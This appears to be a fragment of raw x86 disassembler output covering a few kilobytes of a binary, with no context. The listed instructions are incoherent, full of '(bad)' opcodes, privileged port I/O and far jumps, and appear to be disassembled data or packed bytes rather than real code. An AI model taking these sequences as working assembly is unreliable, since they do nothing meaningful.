  41d936:	jns    0x41d976
  41d938:	jo     0x41d8f3
  41d93a:	jae    0x41d906
  41d93c:	mov    dh,0x42
  41d93e:	dec    eax
  41d93f:	fwait
  41d940:	push   esi
  41d941:	cwde   
  41d942:	xor    DWORD PTR [ebp+esi*4+0x75],0x14
  41d947:	adc    DWORD PTR [eax-0xa],edx
  41d94a:	pop    esi
  41d94b:	inc    esi
  41d94c:	daa    
  41d94d:	scas   eax,DWORD PTR es:[edi]
  41d94e:	mov    dh,0x58
  41d950:	adc    eax,0x4ba358b8
  41d955:	push   eax
  41d956:	mov    ah,0xb5
  41d958:	push   0x97d030ae
  41d95d:	push   ss
  41d95e:	hlt    
  41d95f:	dec    ebp
  41d960:	in     al,0xa1
  41d962:	add    eax,0x9df059e3
  41d967:	mov    ?,WORD PTR [ebx-0x35]
  41d96a:	inc    eax
  41d96b:	sub    cl,BYTE PTR ds:0xe31d0f01
  41d971:	imul   ecx,DWORD PTR [esi],0xcb0bfe3f
  41d977:	dec    eax
  41d978:	pop    ss
  41d979:	lahf   
  41d97a:	fistp  QWORD PTR [eax]
  41d97c:	(bad)  
  41d97d:	into   
  41d97e:	sbb    edi,eax
  41d980:	mov    edi,0x1d61b83d
  41d985:	dec    esi
  41d986:	add    al,0x23
  41d988:	fimul  WORD PTR [ebx-0x59]
  41d98b:	mov    al,ds:0xd86258ba
  41d990:	jp     0x41d9b1
  41d992:	mov    ecx,0x9d14509e
  41d997:	jle    0x41d968
  41d999:	and    DWORD PTR [edi-0x7e588ec6],0xb6875372
  41d9a3:	popa   
  41d9a4:	fdiv   DWORD PTR [ebx+0x75b42d5]
  41d9aa:	popa   
  41d9ab:	aad    0x2d
  41d9ad:	mov    esi,0x394f4e0
  41d9b2:	in     eax,0x1
  41d9b4:	push   cs
  41d9b5:	lahf   
  41d9b6:	mov    ch,BYTE PTR [edi+esi*4]
  41d9b9:	push   es
  41d9ba:	inc    edx
  41d9bb:	sub    esp,edi
  41d9bd:	aaa    
  41d9be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9bf:	cs pop eax
  41d9c1:	(bad)  
  41d9c2:	mov    ds:0x1defb6b4,al
  41d9c7:	sub    BYTE PTR [edx+0x33fd2152],0xf9
  41d9ce:	pop    edx
  41d9cf:	pop    es
  41d9d0:	ret    
  41d9d1:	sub    DWORD PTR fs:[esi],ecx
  41d9d4:	push   eax
  41d9d5:	jge    0x41da07
  41d9d7:	icebp  
  41d9d8:	sbb    ebp,edi
  41d9da:	ret    0x93d0
  41d9dd:	add    BYTE PTR [esi+ebx*2+0x65],al
  41d9e1:	mov    ds:0xc6821c3d,al
  41d9e6:	loope  0x41d99b
  41d9e8:	retf   
  41d9e9:	test   BYTE PTR [ebx],ch
  41d9eb:	cwde   
  41d9ec:	mov    eax,0x9827da48
  41d9f1:	cmp    eax,0x25f0bb41
  41d9f6:	out    0xed,eax
  41d9f8:	push   edx
  41d9f9:	repnz iret 
  41d9fb:	jecxz  0x41d9da
  41d9fd:	loope  0x41da12
  41d9ff:	in     eax,dx
  41da00:	jbe    0x41d9cf
  41da02:	retf   0x6f05
  41da05:	iret   
  41da06:	add    DWORD PTR [esp+ebx*2],ebp
  41da09:	fadd   QWORD PTR [ebx]
  41da0b:	cmp    edi,edx
  41da0d:	test   al,0xc2
  41da0f:	popa   
  41da10:	dec    ebx
  41da11:	adc    BYTE PTR [edx+0x5913339f],dh
  41da17:	inc    esp
  41da18:	out    dx,al
  41da19:	dec    ebp
  41da1a:	adc    eax,0xfd2f7378
  41da1f:	xor    ah,BYTE PTR [esi+0x70]
  41da22:	(bad)  
  41da23:	push   0x1
  41da25:	(bad)  
  41da26:	sub    al,0x32
  41da28:	repnz pop ebx
  41da2a:	(bad)  
  41da2b:	dec    eax
  41da2c:	jnp    0x41da54
  41da2e:	dec    esi
  41da2f:	sahf   
  41da30:	jge    0x41da6c
  41da32:	mov    ebp,DWORD PTR [ecx+0x1a]
  41da35:	mov    ebp,DWORD PTR [edi]
  41da37:	ja     0x41da00
  41da39:	es out 0xcd,al
  41da3c:	mov    WORD PTR [ebx+esi*4],fs
  41da3f:	repnz out 0xb,al
  41da42:	ret    0x22d0
  41da45:	mov    esp,0x2bb6ada2
  41da4a:	not    BYTE PTR [ecx-0x11e39ab7]
  41da50:	mov    dl,0x87
  41da52:	add    al,0xa7
  41da54:	out    dx,eax
  41da55:	popa   
  41da56:	mov    dh,bl
  41da58:	sub    edi,DWORD PTR [ecx]
  41da5a:	cmp    al,0x5a
  41da5c:	sub    dh,BYTE PTR [ebx-0x60]
  41da5f:	aam    0xdd
  41da61:	cmp    dl,BYTE PTR [ecx+eax*1]
  41da64:	inc    ebp
  41da65:	cmp    cl,BYTE PTR [esi-0x24eca05f]
  41da6b:	std    
  41da6c:	fst    DWORD PTR [edx-0x68]
  41da6f:	xchg   esi,eax
  41da70:	adc    DWORD PTR [edx+0x12336484],edi
  41da76:	loope  0x41daa2
  41da78:	retf   
  41da79:	retf   0x752e
  41da7c:	and    BYTE PTR [eax],0x20
  41da7f:	call   0xa54f2955
  41da84:	add    bl,BYTE PTR [edx]
  41da86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da87:	sbb    ah,al
  41da89:	addr16 icebp 
  41da8b:	retf   0x4c14
  41da8e:	inc    esi
  41da8f:	sbb    al,0x50
  41da91:	lock fsub QWORD PTR [ecx-0x599f9877]
  41da98:	mov    bl,0x9e
  41da9a:	xchg   edi,eax
  41da9b:	enter  0xf3b,0x7e
  41da9f:	into   
  41daa0:	fimul  DWORD PTR [ebx-0x65]
  41daa3:	pop    ds
  41daa4:	out    0x1,al
  41daa6:	not    esi
  41daa8:	mov    al,0xc2
  41daaa:	loope  0x41db24
  41daac:	loopne 0x41da33
  41daae:	in     al,dx
  41daaf:	add    al,0xd9
  41dab1:	fst    QWORD PTR [esi-0x55]
  41dab4:	jno    0x41db13
  41dab6:	ror    edx,1
  41dab8:	dec    eax
  41dab9:	daa    
  41daba:	neg    DWORD PTR [ebp+ecx*8-0x32b0b422]
  41dac1:	jle    0x41da69
  41dac3:	(bad)  
  41dac4:	test   DWORD PTR ds:0x38927d3c,0x93fcf0f8
  41dace:	cli    
  41dacf:	out    dx,al
  41dad0:	mov    eax,DWORD PTR [ecx+0x1ff79b12]
  41dad6:	push   es
  41dad7:	shr    DWORD PTR [ebx-0x6e05e08d],0x3c
  41dade:	jg     0x41dacc
  41dae0:	mov    ch,0x6e
  41dae2:	push   ss
  41dae3:	and    BYTE PTR ds:0x90a7c192,al
  41dae9:	pop    ebx
  41daea:	imul   esp,DWORD PTR [eax+edx*8],0xffffffe0
  41daee:	aaa    
  41daef:	leave  
  41daf0:	call   0x97ac7d5d
  41daf5:	ins    DWORD PTR es:[edi],dx
  41daf6:	and    eax,0x9fcf4b4e
  41dafb:	or     eax,0x1c44cd54
  41db00:	xor    DWORD PTR [edx],edi
  41db02:	int3   
  41db03:	mov    cl,0x29
  41db05:	dec    edx
  41db06:	mov    BYTE PTR [eax+0x1a8db216],al
  41db0c:	std    
  41db0d:	adc    bl,BYTE PTR [ebx-0x3f135aad]
  41db13:	js     0x41db90
  41db15:	adc    al,0xa0
  41db17:	(bad)  
  41db18:	mov    eax,ds:0xacc40f3
  41db1d:	dec    esp
  41db1e:	dec    ebx
  41db1f:	jb     0x41dae2
  41db21:	out    0xd5,al
  41db23:	inc    eax
  41db24:	add    edx,0x41
  41db27:	ins    DWORD PTR es:[edi],dx
  41db28:	mov    edx,0xb9c56dd4
  41db2d:	mov    DWORD PTR [edx-0x5f],edx
  41db30:	sbb    al,0x8f
  41db32:	or     ebp,ebx
  41db34:	(bad)  
  41db36:	mov    al,BYTE PTR [edi+edx*1+0x21283a50]
  41db3d:	add    al,0x5d
  41db3f:	jecxz  0x41dad4
  41db41:	dec    ecx
  41db42:	leave  
  41db43:	lds    edi,FWORD PTR [edi+0x3af4fe82]
  41db49:	ror    BYTE PTR [esi+0x654d551d],1
  41db4f:	leave  
  41db50:	aas    
  41db51:	aam    0x90
  41db53:	nop
  41db54:	pop    esp
  41db55:	aas    
  41db56:	mov    al,ds:0x70c826ae
  41db5b:	pop    edx
  41db5c:	jns    0x41db3c
  41db5e:	mov    ds:0x4052c7db,eax
  41db63:	xchg   ecx,eax
  41db64:	rcr    BYTE PTR [ebp-0x7a83d060],1
  41db6a:	inc    esi
  41db6b:	sub    ecx,edx
  41db6d:	ret    
  41db6e:	ret    0xe987
  41db71:	arpl   WORD PTR [ebx+0x39fb86fe],si
  41db77:	sbb    esp,DWORD PTR [ebx+0x5c]
  41db7a:	pop    es
  41db7b:	xor    ebx,ecx
  41db7d:	je     0x41dbfc
  41db7f:	cmp    DWORD PTR ss:[ebp+eiz*4-0x68848a77],edx
  41db87:	cmp    BYTE PTR [ebp-0x5f91444a],cl
  41db8d:	jecxz  0x41dbb9
  41db8f:	sbb    ch,al
  41db91:	lods   al,BYTE PTR ds:[esi]
  41db92:	test   bl,cl
  41db94:	loope  0x41db19
  41db96:	dec    esi
  41db97:	shl    DWORD PTR [ebx],cl
  41db99:	mov    edi,0xf7f4d0df
  41db9e:	je     0x41db87
  41dba0:	xchg   edi,eax
  41dba1:	pop    ebx
  41dba2:	mov    WORD PTR fs:[ecx+0x2cad323a],es
  41dba9:	gs out dx,eax
  41dbab:	lahf   
  41dbac:	mov    ah,0xab
  41dbae:	lock add ebp,DWORD PTR [esi+0x732027df]
  41dbb5:	lahf   
  41dbb6:	je     0x41db3a
  41dbb8:	sbb    BYTE PTR [esp+ecx*1],al
  41dbbb:	or     al,0x1c
  41dbbd:	test   eax,0x867b2412
  41dbc2:	aam    0x61
  41dbc4:	out    dx,al
  41dbc5:	cdq    
  41dbc6:	nop
  41dbc7:	xchg   edx,eax
  41dbc8:	sub    DWORD PTR [edx+0x45b5ffc9],edi
  41dbce:	loop   0x41dbfe
  41dbd0:	add    DWORD PTR [esi],ebx
  41dbd2:	fmul   QWORD PTR [ebp-0x1e368177]
  41dbd8:	sbb    DWORD PTR [ebx-0x5a29a248],ecx
  41dbde:	mov    eax,0xc76e18fb
  41dbe3:	mov    esp,0xce8f6b29
  41dbe8:	ins    WORD PTR es:[edi],dx
  41dbea:	inc    edx
  41dbeb:	ja     0x41dbe9
  41dbed:	xchg   edx,eax
  41dbee:	push   cs
  41dbef:	cmp    eax,0x3ea572db
  41dbf4:	mov    edx,0x84f8c643
  41dbf9:	mov    ebp,0x475a90dd
  41dbfe:	sahf   
  41dbff:	rol    BYTE PTR [esi],0xe4
  41dc02:	mov    ebx,0x5329c7d8
  41dc07:	jnp    0x41dba6
  41dc09:	loopne 0x41db9b
  41dc0b:	rol    BYTE PTR [ebx-0x87fe460],0xda
  41dc12:	add    DWORD PTR [eax],esp
  41dc14:	mov    bl,0x68
  41dc16:	dec    esi
  41dc17:	mov    ch,BYTE PTR [ebx]
  41dc19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc1a:	pop    eax
  41dc1b:	cmp    eax,0xf3b7ee4
  41dc20:	push   ss
  41dc21:	push   esi
  41dc22:	retf   0x4d85
  41dc25:	mov    ebx,DWORD PTR [eax+edi*8+0x4c]
  41dc29:	mov    ds:0x1c4cf4fa,al
  41dc2e:	call   0xee7f4b44
  41dc33:	daa    
  41dc34:	loop   0x41dbfe
  41dc36:	leave  
  41dc37:	jp     0x41dc17
  41dc39:	push   edi
  41dc3a:	aas    
  41dc3b:	xchg   edi,eax
  41dc3c:	push   edx
  41dc3d:	inc    esi
  41dc3e:	std    
  41dc3f:	and    DWORD PTR [ebx-0x412864b9],0xffffffed
  41dc46:	xchg   esp,eax
  41dc47:	mov    ds:0x172c84be,al
  41dc4c:	cmp    al,0x4a
  41dc4e:	inc    edi
  41dc4f:	std    
  41dc50:	ss push esi
  41dc52:	add    DWORD PTR [ebx],ebx
  41dc54:	les    edi,FWORD PTR [esi-0x6]
  41dc57:	and    DWORD PTR gs:[edi-0x742886d4],edi
  41dc5e:	adc    eax,0xd8686da3
  41dc63:	fcom   DWORD PTR [edi-0xa]
  41dc66:	jae    0x41dcb3
  41dc68:	mov    eax,ds:0x430bd5c3
  41dc6d:	int3   
  41dc6e:	mov    ds:0xda3970a5,al
  41dc73:	cmp    al,BYTE PTR [edx-0x31ce6b2e]
  41dc79:	jmp    0xc051d40a
  41dc7e:	add    eax,0xe716babb
  41dc83:	mov    bl,0xd
  41dc85:	imul   edi,DWORD PTR [ebx],0x87e2af57
  41dc8b:	adc    al,0xc7
  41dc8d:	inc    ecx
  41dc8e:	pushf  
  41dc8f:	xchg   esp,eax
  41dc90:	inc    esp
  41dc91:	cmc    
  41dc92:	ss ret 
  41dc94:	dec    edi
  41dc95:	sub    BYTE PTR [eax+0x12],0x4b
  41dc99:	fmul   QWORD PTR [eax+0x5]
  41dc9c:	(bad)  [esi+0x7d75f32d]
  41dca2:	in     eax,0xfe
  41dca4:	jecxz  0x41dc45
  41dca6:	push   ds
  41dca7:	xchg   esi,eax
  41dca8:	pop    ss
  41dca9:	call   0x3d3b940e
  41dcae:	sbb    edi,DWORD PTR [edx]
  41dcb0:	xor    cl,0xda
  41dcb3:	dec    edi
  41dcb4:	jne    0x41dd1c
  41dcb6:	push   eax
  41dcb7:	aam    0xec
  41dcb9:	mov    cl,0xf8
  41dcbb:	es fs std 
  41dcbe:	and    BYTE PTR [eax],ah
  41dcc0:	ret    
  41dcc1:	mov    edx,edi
  41dcc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcc4:	(bad)  [ebp-0x6a6cdcd5]
  41dcca:	cdq    
  41dccb:	pop    ds
  41dccc:	jmp    0x7c4c6b3
  41dcd1:	cdq    
  41dcd2:	jae    0x41dcca
  41dcd4:	inc    edx
  41dcd5:	inc    esi
  41dcd6:	jmp    0x41dccc
  41dcd8:	nop
  41dcd9:	(bad)  
  41dcda:	fs push es
  41dcdc:	stc    
  41dcdd:	jg     0x41dd2a
  41dcdf:	cld    
  41dce0:	or     BYTE PTR [eax],bh
  41dce2:	cwde   
  41dce3:	cmp    ch,BYTE PTR [edx-0x3c1c0fe9]
  41dce9:	inc    ebx
  41dcea:	mov    edi,0x26338f24
  41dcef:	add    edi,DWORD PTR [eax+0x20a6f0f8]
  41dcf5:	in     al,0x21
  41dcf7:	mov    eax,ds:0x9f5574f6
  41dcfc:	popa   
  41dcfd:	pop    edx
  41dcfe:	adc    DWORD PTR [ebx],0xffffffaf
  41dd01:	and    eax,0x5150df61
  41dd06:	shl    BYTE PTR [ebp-0xe984461],1
  41dd0c:	cmp    DWORD PTR [eax+0x3],ebx
  41dd0f:	scas   eax,DWORD PTR es:[edi]
  41dd10:	ret    
  41dd11:	mov    eax,ds:0xce13fcfd
  41dd16:	hlt    
  41dd17:	(bad)  
  41dd18:	into   
  41dd19:	push   ebx
  41dd1a:	mov    dl,0x27
  41dd1c:	ret    
  41dd1d:	iret   
  41dd1e:	xchg   edi,eax
  41dd1f:	pop    ds
  41dd20:	xchg   BYTE PTR [eax+0x4b],ah
  41dd23:	mov    edi,DWORD PTR [ebx]
  41dd25:	imul   BYTE PTR [ebx+ebx*1+0x3042faf7]
  41dd2c:	mov    ebx,0x4eeed967
  41dd31:	xchg   ebx,eax
  41dd32:	aad    0x15
  41dd34:	fstp   QWORD PTR [ebx-0x197816b9]
  41dd3a:	les    eax,FWORD PTR [ecx+0x34317c8a]
  41dd40:	pusha  
  41dd41:	or     edi,DWORD PTR [edi]
  41dd43:	adc    bl,BYTE PTR [edi+edi*2-0x3f]
  41dd47:	xchg   edi,eax
  41dd48:	adc    eax,esp
  41dd4a:	cld    
  41dd4b:	aam    0x58
  41dd4d:	lahf   
  41dd4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd4f:	out    dx,al
  41dd50:	sti    
  41dd51:	mov    ebx,0x10ecd4c5
  41dd56:	cmp    BYTE PTR [ecx+0x424cac2a],al
  41dd5c:	mov    eax,0x6cff4fc5
  41dd61:	call   0xa6a5fecd
  41dd66:	test   BYTE PTR [edx+ebx*1-0x3d],bh
  41dd6a:	sbb    BYTE PTR [esp+esi*8+0x6f],dh
  41dd6e:	jg     0x41dd56
  41dd70:	jle    0x41dde6
  41dd72:	sbb    BYTE PTR [ecx-0x4112f918],0x79
  41dd79:	jno    0x41ddf0
  41dd7b:	and    cl,dl
  41dd7d:	sbb    eax,0x4e3aaa1
  41dd82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd83:	sahf   
  41dd84:	rcr    DWORD PTR [eax],cl
  41dd86:	pusha  
  41dd87:	enter  0xb72c,0xce
  41dd8b:	popa   
  41dd8c:	cmp    eax,0x6417790
  41dd91:	or     edi,edx
  41dd93:	mov    dh,ch
  41dd95:	dec    ebx
  41dd96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd97:	mov    bl,0x47
  41dd99:	out    0x6c,eax
  41dd9b:	push   esi
  41dd9c:	adc    dl,bl
  41dd9e:	inc    edx
  41dd9f:	push   edx
  41dda0:	or     eax,0x30814b97
  41dda5:	push   edi
  41dda6:	leave  
  41dda7:	aam    0xd0
  41dda9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddaa:	cmc    
  41ddab:	lock push esp
  41ddad:	int3   
  41ddae:	sbb    ecx,edx
  41ddb0:	shr    ah,cl
  41ddb2:	lods   al,BYTE PTR ds:[esi]
  41ddb3:	cmp    ebp,0xffffffea
  41ddb6:	pop    edx
  41ddb7:	and    al,0xe8
  41ddb9:	sub    ch,0xe
  41ddbc:	push   0x6a2b41fd
  41ddc1:	retf   
  41ddc2:	(bad)  [edi]
  41ddc4:	imul   ebx,DWORD PTR [ecx],0xe106c8cf
  41ddca:	dec    edx
  41ddcb:	retf   
  41ddcc:	fmul   QWORD PTR [esi+0xf]
  41ddcf:	xchg   esi,eax
  41ddd0:	pusha  
  41ddd1:	aas    
  41ddd2:	sbb    dh,BYTE PTR [ebx-0x30]
  41ddd5:	and    DWORD PTR [esi+0x3d658ea9],ebx
  41dddb:	jae    0x41de4f
  41dddd:	sbb    al,0xc
  41dddf:	test   BYTE PTR [ecx+0x39],al
  41dde2:	xchg   ecx,eax
  41dde3:	and    al,0xa2
  41dde5:	je     0x41dd7a
  41dde7:	xchg   ecx,eax
  41dde8:	das    
  41dde9:	sti    
  41ddea:	mov    WORD PTR [edi],ds
  41ddec:	xchg   ebp,eax
  41dded:	leave  
  41ddee:	inc    edi
  41ddef:	int    0x72
  41ddf1:	fistp  DWORD PTR [ebx+eax*4-0xa]
  41ddf5:	ficom  WORD PTR [ebp-0x35]
  41ddf8:	mov    esp,0xad3684c3
  41ddfd:	ins    BYTE PTR es:[edi],dx
  41ddfe:	outs   dx,DWORD PTR ds:[esi]
  41ddff:	dec    eax
  41de00:	out    0xa1,eax
  41de02:	lods   al,BYTE PTR ds:[esi]
  41de03:	(bad)  
  41de04:	(bad)  [edx+eax*8]
  41de07:	mov    ebp,DWORD PTR [edi+0x14]
  41de0a:	fsubr  DWORD PTR [edx+0x60b36b73]
  41de10:	or     al,0x60
  41de12:	ss mov esi,0x33153b8a
  41de18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de19:	(bad)  
  41de1a:	ss push 0xd0f7e7a3
  41de20:	inc    eax
  41de21:	jnp    0x41ddfd
  41de23:	mov    ah,0x26
  41de25:	int    0xb4
  41de27:	or     esp,DWORD PTR [ebp-0x15]
  41de2a:	call   0xa3de2151
  41de2f:	rcl    DWORD PTR [eax-0x6dcfe0eb],cl
  41de35:	fsubr  QWORD PTR [edi+esi*4+0x2791f898]
  41de3c:	lahf   
  41de3d:	jp     0x41deac
  41de3f:	shl    eax,0x8e
  41de42:	and    DWORD PTR [esi-0x3b],ebx
  41de45:	nop
  41de46:	and    eax,0x38a2607d
  41de4b:	cld    
  41de4c:	sbb    eax,DWORD PTR [edx*1+0x33599040]
  41de53:	loopne 0x41ddda
  41de55:	add    eax,DWORD PTR [edi-0x2c]
  41de58:	sub    al,0xce
  41de5a:	ficom  DWORD PTR [ecx-0x58]
  41de5d:	pusha  
  41de5e:	and    eax,0xb2a74df9
  41de63:	push   ecx
  41de64:	retf   0xdd4a
  41de67:	mov    dl,0x1
  41de69:	sbb    eax,DWORD PTR [edx-0xe]
  41de6c:	mov    ah,BYTE PTR [edx]
  41de6e:	pop    esi
  41de70:	je     0x41de15
  41de72:	std    
  41de73:	neg    BYTE PTR [edi-0x56]
  41de76:	cwde   
  41de77:	mov    eax,0xb7b91ea1
  41de7c:	paddb  mm2,QWORD PTR [esi+0x67956625]
  41de83:	mov    al,cl
  41de85:	push   esp
  41de86:	cmp    al,0xa6
  41de88:	adc    eax,0x3128a2fd
  41de8d:	cmp    eax,0x8faec642
  41de92:	sub    bl,BYTE PTR [edx+0x1bbab64a]
  41de98:	mov    cl,0x6c
  41de9a:	cli    
  41de9b:	fstp   DWORD PTR [esi-0x2]
  41de9e:	adc    al,0xca
  41dea0:	xor    eax,DWORD PTR [esp+ecx*4]
  41dea3:	(bad)  
  41dea4:	rol    DWORD PTR [esp+esi*4+0xfacfac8],0xbf
  41deac:	and    eax,0x4711fd96
  41deb1:	lds    edi,FWORD PTR [ecx+edi*2-0x1]
  41deb5:	cmp    BYTE PTR [ebx],al
  41deb7:	loopne 0x41de8f
  41deb9:	sub    ecx,eax
  41debb:	shl    BYTE PTR [ebp-0x3f],1
  41debe:	sbb    eax,0x810f275d
  41dec3:	add    BYTE PTR [edx+esi*2+0x75d74e21],dh
  41deca:	loopne 0x41deb4
  41decc:	aas    
  41decd:	mov    edi,0xd62f8ecc
  41ded2:	clc    
  41ded3:	xchg   ebx,eax
  41ded4:	add    BYTE PTR [ebx+0x126d6133],ch
  41deda:	aad    0x8f
  41dedc:	mov    bh,0xb9
  41dede:	pop    edx
  41dedf:	popf   
  41dee0:	out    dx,eax
  41dee1:	call   0x6412:0x8b3de57b
  41dee8:	mov    esi,0x301141c8
  41deed:	sbb    DWORD PTR cs:[ecx+0x4a],ebp
  41def1:	cmp    ebx,edi
  41def3:	push   ss
  41def4:	fimul  DWORD PTR [edi+0x37]
  41def7:	cs mov bl,0xc5
  41defa:	inc    ebp
  41defb:	in     al,dx
  41defc:	xlat   BYTE PTR ds:[ebx]
  41defd:	jmp    0x3e6a:0xb4f0820d
  41df04:	mov    dl,0x7a
  41df06:	das    
  41df07:	rol    BYTE PTR [esi],1
  41df09:	xchg   ebp,eax
  41df0a:	lock fistp DWORD PTR [ecx]
  41df0d:	mov    eax,ds:0xf0612653
  41df12:	sbb    bh,cl
  41df14:	jecxz  0x41df52
  41df16:	inc    esp
  41df17:	jmp    0x41df38
  41df19:	dec    eax
  41df1a:	repz fprem 
  41df1d:	lods   al,BYTE PTR ds:[esi]
  41df1e:	push   edx
  41df1f:	ret    
  41df20:	mov    ch,0x71
  41df22:	ret    0x4129
  41df25:	cwde   
  41df26:	mov    ebp,0x4f61fdf4
  41df2b:	push   esi
  41df2c:	gs cli 
  41df2e:	push   cs
  41df2f:	cmp    al,0x73
  41df31:	iret   
  41df32:	outs   dx,DWORD PTR ds:[esi]
  41df33:	and    al,0x91
  41df35:	inc    eax
  41df36:	cmc    
  41df37:	fadd   QWORD PTR ds:0xb6bb096e
  41df3d:	mov    ds:0xfc62b439,al
  41df42:	pushf  
  41df43:	call   0xf662:0x7deaf192
  41df4a:	outs   dx,BYTE PTR ds:[esi]
  41df4b:	out    dx,al
  41df4c:	std    
  41df4d:	push   es
  41df4e:	ja     0x41def5
  41df50:	mov    esi,ebx
  41df52:	xor    DWORD PTR [ecx],ebx
  41df54:	mov    cl,0x8
  41df56:	xchg   al,bl
  41df58:	push   ebx
  41df59:	jl     0x41dfcc
  41df5b:	loop   0x41df97
  41df5d:	add    al,0xb3
  41df5f:	mov    bh,0x94
  41df61:	nop
  41df62:	jl     0x41dfa8
  41df64:	fcomi  st,st(7)
  41df66:	sbb    al,0x78
  41df68:	sub    esp,edx
  41df6a:	aaa    
  41df6b:	add    eax,0xa38d3419
  41df70:	fisubr DWORD PTR [eax]
  41df72:	add    al,0x1a
  41df74:	ins    BYTE PTR es:[edi],dx
  41df75:	cli    
  41df76:	dec    edi
  41df77:	mov    edi,0x60b06c7c
  41df7c:	shr    BYTE PTR [edi+0x24eb25d6],1
  41df82:	outs   dx,DWORD PTR ds:[esi]
  41df83:	xchg   ebx,eax
  41df84:	imul   esi,DWORD PTR [ebx+0x7b0eb985],0x8a76889a
  41df8e:	cmc    
  41df8f:	add    eax,0xd1084c3b
  41df94:	mov    ebp,?
  41df96:	(bad)  
  41df97:	adc    edi,DWORD PTR [edx+0x110c847a]
  41df9d:	jo     0x41df70
  41df9f:	scas   al,BYTE PTR es:[edi]
  41dfa0:	jo     0x41e01e
  41dfa2:	cld    
  41dfa3:	pusha  
  41dfa4:	lods   eax,DWORD PTR ds:[esi]
  41dfa5:	ret    0xe569
  41dfa8:	dec    esi
  41dfa9:	stc    
  41dfaa:	mov    sp,0x28c3
  41dfae:	mov    cl,0x74
  41dfb0:	push   ds
  41dfb1:	jae    0x41df6e
  41dfb3:	and    ebp,DWORD PTR [esi]
  41dfb5:	inc    ebx
  41dfb6:	or     eax,DWORD PTR [ecx-0x642371b0]
  41dfbc:	add    dl,BYTE PTR [edx+eiz*1]
  41dfbf:	inc    edx
  41dfc0:	stos   BYTE PTR es:[edi],al
  41dfc1:	cmp    dh,BYTE PTR [ecx+0x7d31ccef]
  41dfc7:	popa   
  41dfc8:	sbb    al,ch
  41dfca:	and    BYTE PTR [ebx+eax*2+0x69],ah
  41dfce:	or     DWORD PTR [edx],0x4a07278b
  41dfd4:	sbb    BYTE PTR [edi-0x49650e75],bh
  41dfda:	imul   ebx,DWORD PTR [esi+edx*2-0x72],0x3c
  41dfdf:	jle    0x41df99
  41dfe1:	and    DWORD PTR ds:0xec1f7cf7,ebp
  41dfe7:	mov    eax,ds:0xf4b271dc
  41dfec:	ss dec ecx
  41dfee:	aam    0x3e
  41dff0:	mov    DWORD PTR [ebp+0x1f],0xa06532f6
  41dff7:	add    eax,DWORD PTR [edx+eax*4-0x75]
  41dffb:	and    al,0xcd
  41dffd:	dec    esp
  41dffe:	sub    al,0xf9
  41e000:	or     bl,al
  41e002:	shl    DWORD PTR [edx-0x3d],cl
  41e005:	in     al,dx
  41e006:	mov    WORD PTR ds:0x54c326ce,cs
  41e00c:	xor    edi,DWORD PTR [edx-0x52]
  41e00f:	loop   0x41e009
  41e011:	xchg   esp,eax
  41e012:	sbb    al,0xa5
  41e014:	push   ecx
  41e015:	add    eax,0x38c012c5
  41e01a:	inc    esp
  41e01b:	sti    
  41e01c:	mov    ebp,ds
  41e01e:	outs   dx,BYTE PTR ds:[esi]
  41e01f:	pop    eax
  41e020:	std    
  41e021:	xchg   ebx,eax
  41e022:	and    bl,ah
  41e024:	mov    al,ds:0x6ab5a28f
  41e029:	xchg   BYTE PTR [eax],dh
  41e02b:	cmp    esi,esp
  41e02d:	nop
  41e02e:	mov    gs,WORD PTR [ebx-0x125a038c]
  41e034:	lahf   
  41e035:	sbb    dl,BYTE PTR [esi]
  41e037:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e038:	add    BYTE PTR [ebx-0x52f7c010],dh
  41e03e:	pop    esp
  41e03f:	cwde   
  41e040:	jno    0x41e090
  41e042:	and    DWORD PTR [eax],edx
  41e044:	jbe    0x41e03d
  41e046:	pop    esi
  41e047:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e048:	xchg   esp,eax
  41e049:	push   esp
  41e04a:	sub    BYTE PTR [ecx-0x3c47481],al
  41e050:	and    edi,ecx
  41e052:	dec    edi
  41e053:	inc    ecx
  41e054:	loop   0x41e06c
  41e056:	dec    ebx
  41e057:	pushf  
  41e058:	(bad)  
  41e059:	mov    ecx,0x65da54fd
  41e05e:	out    dx,eax
  41e05f:	mov    bl,BYTE PTR [edi-0x4f4fb173]
  41e065:	pop    ebp
  41e066:	cmc    
  41e067:	add    al,0xfd
  41e069:	mov    edi,0x78856248
  41e06e:	ror    dh,cl
  41e070:	aam    0x1
  41e072:	mov    eax,0xf777752d
  41e077:	ds pop ss
  41e079:	ss sti 
  41e07b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e07c:	loope  0x41e0b9
  41e07e:	sub    esp,DWORD PTR [edi+0x2]
  41e081:	push   esi
  41e082:	and    eax,0x55dafe6e
  41e087:	jp     0x41e05f
  41e089:	popa   
  41e08a:	test   dh,al
  41e08c:	fwait
  41e08d:	or     edi,esi
  41e08f:	retf   0xb339
  41e092:	push   es
  41e093:	ror    al,cl
  41e095:	(bad)  
  41e096:	mov    DWORD PTR [esi-0x6c],ebp
  41e099:	pusha  
  41e09a:	xchg   ebp,eax
  41e09b:	ficom  DWORD PTR [edx]
  41e09d:	inc    ecx
  41e09e:	sbb    BYTE PTR [edi-0x7e7b8f1d],bl
  41e0a4:	stos   BYTE PTR es:[edi],al
  41e0a5:	push   esp
  41e0a6:	adc    DWORD PTR [eax+0x1e],edx
  41e0a9:	adc    eax,0xd102cfdd
  41e0ae:	sbb    ebx,DWORD PTR [eax]
  41e0b0:	sub    DWORD PTR [ebp-0x15],edx
  41e0b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0b4:	in     al,dx
  41e0b5:	cmp    al,BYTE PTR [edi]
  41e0b7:	(bad)  
  41e0b8:	dec    eax
  41e0b9:	mov    bh,0x25
  41e0bb:	dec    esi
  41e0bc:	adc    BYTE PTR [edx+0x2d5abf11],dl
  41e0c2:	adc    dh,BYTE PTR [esi-0x50]
  41e0c5:	or     eax,0x2d1e75c3
